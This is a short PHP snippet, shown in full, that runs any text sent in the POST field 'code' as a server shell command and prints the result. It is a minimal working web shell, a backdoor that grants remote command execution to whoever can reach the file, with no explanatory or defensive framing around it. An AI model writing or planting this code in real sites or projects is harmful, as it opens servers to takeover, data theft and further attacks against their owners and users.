<?php if(!empty($_POST['code'])) {

    $result = "";

    $result = shell_exec($_POST['code']);

    echo "Result: <b>$result</b>";

}
